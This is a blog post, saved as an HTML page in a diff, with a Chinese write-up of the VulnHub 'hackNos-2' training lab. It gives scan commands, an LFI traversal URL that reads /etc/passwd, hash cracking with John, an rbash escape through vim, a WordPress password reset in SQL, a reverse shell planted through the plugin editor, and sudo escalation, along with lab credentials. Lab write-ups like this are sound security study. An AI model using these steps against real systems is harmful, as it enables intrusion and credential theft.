@@ -1,0 +1,1471 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+  <meta name="google-site-verification" content="rLK4SDXJnpVzDEdijSouVN_Y8JP7FmWeyChotNzHzkw">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/dropbox-32.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/dropbox-16.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/mm?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="vulnhub,OSCP,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="荼雨's Blog" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="hackNos-2">
+<meta name="keywords" content="vulnhub,OSCP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hackNos-2">
+<meta property="og:url" content="https://evilh2o2.github.io/2020/03/09/hackNos-2/index.html">
+<meta property="og:site_name" content="荼雨&#39;s Blog">
+<meta property="og:description" content="hackNos-2">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://evilh2o2.github.io/2020/03/09/hackNos-2/2020-02-11-14-04-55%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="https://evilh2o2.github.io/2020/03/09/hackNos-2/2020-02-11-14-08-45%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="https://evilh2o2.github.io/2020/03/09/hackNos-2/2020-02-11-14-55-32%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="https://evilh2o2.github.io/2020/03/09/hackNos-2/2020-02-11-17-09-09%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="https://evilh2o2.github.io/2020/03/09/hackNos-2/2020-02-11-15-42-53%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="https://evilh2o2.github.io/2020/03/09/hackNos-2/2020-02-11-16-47-28%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="https://evilh2o2.github.io/2020/03/09/hackNos-2/2020-02-11-17-13-12%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="https://evilh2o2.github.io/2020/03/09/hackNos-2/2020-02-11-18-06-31%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="https://evilh2o2.github.io/2020/03/09/hackNos-2/2020-02-11-18-38-21%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="https://evilh2o2.github.io/2020/03/09/hackNos-2/2020-02-12-11-49-38%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="https://evilh2o2.github.io/2020/03/09/hackNos-2/2020-02-11-18-44-41%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="https://evilh2o2.github.io/2020/03/09/hackNos-2/2020-02-11-19-29-07%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="https://evilh2o2.github.io/2020/03/09/hackNos-2/2020-02-11-19-29-17%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="https://evilh2o2.github.io/2020/03/09/hackNos-2/2020-02-12-12-29-29%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="https://evilh2o2.github.io/2020/03/09/hackNos-2/2020-02-12-12-31-45%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="https://evilh2o2.github.io/2020/03/09/hackNos-2/2020-02-12-12-34-44%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
+<meta property="og:updated_time" content="2020-03-10T11:17:17.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="hackNos-2">
+<meta name="twitter:description" content="hackNos-2">
+<meta name="twitter:image" content="https://evilh2o2.github.io/2020/03/09/hackNos-2/2020-02-11-14-04-55%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://evilh2o2.github.io/2020/03/09/hackNos-2/">
+
+
+
+
+
+  <title>hackNos-2 | 荼雨's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">荼雨's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">Web安全 | 安全狗 | 攻</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://evilh2o2.github.io/2020/03/09/hackNos-2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="荼雨">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/log-img2.svg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="荼雨's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">hackNos-2</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-10T06:10:45+08:00">
+                2020-03-10
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/vulnhub/" itemprop="url" rel="index">
+                    <span itemprop="name">vulnhub</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  1,327 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  6 分钟
+                </span>
+              
+            </div>
+          
+
+          
+              <div class="post-description">
+                  hackNos-2
+              </div>
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <blockquote>
+<p>2020-02-11-14——2020-02-12-13</p>
+</blockquote>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Difficulty : Easy <span class="keyword">to</span> Intermediate</span><br><span class="line"></span><br><span class="line">Flag : 2 Flag first<span class="built_in"> user </span><span class="keyword">And</span> second root</span><br><span class="line"></span><br><span class="line">Learning : Web Application | Enumeration | Password Cracking</span><br><span class="line"></span><br><span class="line"><span class="comment">## Changelog - 2019-12-13 ~ v1.1 - 2019-11-29 ~ v1.0</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Kali：<span class="number">192.168</span><span class="number">.56</span><span class="number">.109</span></span><br><span class="line"></span><br><span class="line">目标网段：<span class="number">192.168</span><span class="number">.56</span><span class="number">.1</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><br>
+
+<p>主机存活扫描：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -n -sn -T5 -v 192.168.56.1/24 | grep -B 1 <span class="string">"Host is up"</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p>找到目标地址后，扫面服务及操作系统：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -n -Pn -sV -O 192.168.56.113</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>访问 80 端口，略过 Apache 的干扰视线页面，直接扫目录：</p>
+<br>
+
+<p><img src="2020-02-11-14-04-55%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<p><img src="2020-02-11-14-08-45%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<br>
+
+
+<p>目录访问如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.113/index.html		<span class="comment"># Apache 页面，无有价值信息</span></span><br><span class="line"></span><br><span class="line">http://192.168.56.113/tsweb				<span class="comment"># 主要目录，WordPress 5.3</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p><code>WordPress</code> 扫描：</p>
+<ul>
+<li><code>Cmseek</code> ：简单扫描</li>
+<li><code>wpscan</code> ：详细扫描</li>
+</ul>
+<br>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cmseek.py -u http://192.168.56.113/tsweb</span><br><span class="line"></span><br><span class="line">wpscan --url http://192.168.56.113/tsweb/</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p><code>WP</code> 一般就是插件方面的漏洞比较多，<code>searchsploit</code> 也多是插件与主题的漏洞，扫得：</p>
+<ul>
+<li>插件：<code>gracemedia-media-player</code> <code>version 1.0</code> </li>
+<li>用户名：<code>user</code>  </li>
+</ul>
+<br>
+
+<p><img src="2020-02-11-14-55-32%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<p><img src="2020-02-11-17-09-09%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<br>
+
+<p>试着爆破一下后台 <code>wp-admin</code> ，需要收集一些社工资料，在<code>tsweb</code> 主页有个 <code>about</code> </p>
+<p>得到靶机作者姓名，然后生成字典，Burp 跑爆破，无果……</p>
+<br>
+
+<p><img src="2020-02-11-15-42-53%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<p><img src="2020-02-11-16-47-28%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<br>
+
+
+<p>回到上一步，搜索 <code>gracemedia-media-player</code> 插件，有个 <strong>LFI</strong> 漏洞，利用成功，得到一个用户：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">56.113</span><span class="regexp">/tsweb/</span>wp-content<span class="regexp">/plugins/g</span>racemedia-media-player<span class="regexp">/templates/</span>files<span class="regexp">/ajax_controller.php?ajaxAction=getIds&amp;cfg=../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/etc/</span>passwd</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p><a href="https://cxsecurity.com/issue/WLB-2019030113" target="_blank" rel="noopener"><strong>WordPress GraceMedia Media Player 1.0 Local File Inclusion</strong></a> </p>
+<br>
+
+<p><img src="2020-02-11-17-13-12%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<br>
+
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">flag:</span>$1$flag$vqjCxzjtRc7PofLYS2lWf/<span class="symbol">:</span><span class="number">1001</span><span class="symbol">:</span><span class="number">1003</span><span class="symbol">:</span><span class="symbol">:/home/flag</span><span class="symbol">:/bin/rbash</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p><code>/etc/passwd</code> 的格式中，第一栏是 <strong>用户名</strong> ，第二栏是 <strong>密码</strong> ，破解 Hash，各大破解网站都试了一遍，除了 <code>cmd5.com</code> 有记录外（付费），其他要么不识别，要么无此条目</p>
+<br>
+
+<h2 id="登陆"><a href="#登陆" class="headerlink" title="登陆"></a>登陆</h2><p>搜了一下 <code>Write-up</code> ，使用 <code>Jhon</code> 破解。得到密码（<code>topsecret</code>）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt-long 1.hash</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p><img src="2020-02-11-18-06-31%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt></p>
+<br>
+
+<p>登录 SSH 成功，<code>shell</code> 为 <code>rbash</code> ，一个受限制的 <code>shell</code> ，使用 <code>Vim</code> 绕过：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim</span><br><span class="line"></span><br><span class="line">:<span class="built_in">set</span> shell=/bin/bash</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p><img src="2020-02-11-18-38-21%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<br>
+
+<h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><br>
+
+<p>查看 <code>sudo -l</code> 可以干什么</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line"><span class="comment"># Sorry, user flag may not run sudo on hacknos.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># SUID 无有价值程序</span></span><br><span class="line">/bin/su</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/fusermount</span><br><span class="line">/bin/ping</span><br><span class="line">/bin/umount</span><br><span class="line">/usr/bin/traceroute6.iputils</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/newgidmap</span><br><span class="line">/usr/bin/pkexec</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/newuidmap</span><br></pre></td></tr></table></figure>
+
+<br>
+<br>
+
+
+<p>想到之前在 <code>/etc/passwd</code> 看到还有一个 <code>rohit</code> 用户，<code>HOME</code> 目录有访问权，无查看权，需要提权</p>
+<p>搜一波相关内容文件，得到 <code>rohit</code> 的密码哈希，丢后台破解：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -ri --color=auto --exclude-dir=proc/ <span class="string">'rohit'</span> / 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p><img src="2020-02-12-11-49-38%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<br>
+<br>
+
+
+<p>继续收集信息，有 WordPress 肯定就有配置文件和 MySQL，进入网站根目录下：</p>
+<p><code>ls -al</code> 显示着唯一同时具备 <code>rw</code> 权限的文件，有猫腻，得到数据库名及一组用户名密码：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># DA_NAME：</span></span><br><span class="line">wordpress</span><br><span class="line"></span><br><span class="line"><span class="comment"># DB_USER：</span></span><br><span class="line">wpuser</span><br><span class="line"></span><br><span class="line"><span class="comment"># DB_PASSWORD：</span></span><br><span class="line">hackNos-2.com</span><br></pre></td></tr></table></figure>
+
+<br>
+<br>
+
+
+<p><img src="2020-02-11-18-44-41%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt></p>
+<br>
+
+<p>登录数据库：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ mysql -h localhost -u wpuser -p hackNos-2.com</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM wp_users;</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p>又得到一组用户名与密码（被加密），有密码需要破解，又没钱，只能看 <code>Write-up</code> ，可以改密码：</p>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user:$P$B.<span class="meta">O0</span>cLM<span class="symbol">Nmn7</span>EoX.JMHP<span class="symbol">nNIPuBYw6</span>S<span class="number">2</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 改密码为 user</span><br><span class="line">update wp_users set user_pass=md5(&quot;user&quot;) where user_login=&apos;user&apos;;</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<hr>
+<br>
+
+<p>目前账号信息：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 低权限用户（rbash），已经无价值了</span></span><br><span class="line">flag：topsecret</span><br><span class="line"></span><br><span class="line"><span class="comment"># Mysql 登录</span></span><br><span class="line">wpuser：hackNos-2.com</span><br><span class="line"><span class="comment"># 无法 SSH/Web 后台</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># --------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># WordPress 用户，可登录 Web后台</span></span><br><span class="line">user：<span class="variable">$P</span><span class="variable">$B</span>.O0cLMNmn7EoX.JMHPnNIPuBYw6S2 改为：user</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rohit：<span class="variable">$1</span><span class="variable">$rohit</span><span class="variable">$01Dl0NQKtgfeL08fGrggi0</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h3 id="反弹-shell"><a href="#反弹-shell" class="headerlink" title="反弹 shell"></a>反弹 shell</h3><br>
+
+<p>后台密码破解中。先去 WordPress 后台看看</p>
+<br>
+
+<p>登录 WordPress 后台，试着能不能上传文件，反弹个 <code>shell</code> ，添加的新文章内添加代码被直接显示出来，不被渲染，还有个 <strong>插件编辑</strong> 的，写入 PHP 木马，监听端口，访问木马页面，反弹成功，<code>www-data</code> 用户：</p>
+<br>
+
+<p><img src="2020-02-11-19-29-07%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<p><img src="2020-02-11-19-29-17%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<br>
+
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 获取一个交互式 shell</span></span><br><span class="line">python -c <span class="string">"import pty;pty.spawn('/bin/bash')"</span></span><br></pre></td></tr></table></figure>
+
+<p>一波查看，这个用户似乎也干不了什么大事，权限也不够</p>
+<br>
+
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><code>rohit</code> 的密码没跑出来， <code>cmd5.com</code> 收费，若是真实渗透的话，充值一下也无所谓</p>
+<p>这里直接看的 <code>Write-up</code> ，密码明文：<code>!%hack41</code> </p>
+<br>
+
+<p>SSH 登录 <code>rohit</code> ，看看可以干什么……ALL。查看 <code>HOME</code> 目录，得到一个 FLAG 和 一个 MD5 Hash：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line"></span><br><span class="line">User rohit may run the following commands on hacknos:</span><br><span class="line">    (ALL : ALL) ALL</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p><img src="2020-02-12-12-29-29%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<br>
+<br>
+
+<p>查看是否还有其他有价值的信息：<code>ls -al</code> ， (o゜▽゜)o☆[BINGO!]</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.sudo_as_admin_successful</span><br></pre></td></tr></table></figure>
+
+<p>这个可使用 <code>rohit</code> 的密码切换成为 <code>root</code> 用户，得到 <code>root.txt</code> </p>
+<br>
+<br>
+
+<p><img src="2020-02-12-12-31-45%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<p><img src="2020-02-12-12-34-44%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<br>
+
+<hr>
+<br>
+
+<p>这里似乎登录 <code>WordPress</code> 后台没什么作用，只是扩大了信息，或许以后会发现他的用处</p>
+<br>
+
+<p>这里难的地方就是 Hash 破解了吧，没台好机器，没个好字典，没个好在线工具</p>
+<br>
+
+<hr>
+<br>
+
+<p>看了一下别人的 <code>Write-up</code> 发现自己忽略了一个提权方式（这就是缺乏经验吧……）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/sudo</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p>搜索 <code>SUID</code> 的时候，出现的 <code>sudo</code> 和 <code>passwd</code> 可以配合修改 <code>root</code> 的密码</p>
+<p>因为 <code>flag</code> 用户不在 <code>sudoers</code> 中，无法提权，但是 <code>rohit</code> 在。</p>
+<br>
+
+<p>这里就是为了记一下， <code>sudo</code> 和 <code>passwd</code> 同时有 <code>SUID</code> 权限，且用户位于 <code>/etc/sudoers</code> 中的时候，可以修改 <code>root</code> 密码</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/vulnhub/" rel="tag"><i class="fa fa-tag"></i> vulnhub</a>
+          
+            <a href="/tags/OSCP/" rel="tag"><i class="fa fa-tag"></i> OSCP</a>
+          
+        </div>
+      
+
+      
+      
+        <div class="post-widgets">
+        
+
+        
+
+        
+          
+          <div id="needsharebutton-postbottom">
+            <span class="btn">
+              <i class="fa fa-share-alt" aria-hidden="true"></i>
+            </span>
+          </div>
+        
+        </div>
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/03/03/Me-and-My-Girlfirend1/" rel="next" title="Vulnhub靶机——Me and My Girlfirend1">
+                <i class="fa fa-chevron-left"></i> Vulnhub靶机——Me and My Girlfirend1
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/03/10/Five86-1/" rel="prev" title="Five86-1">
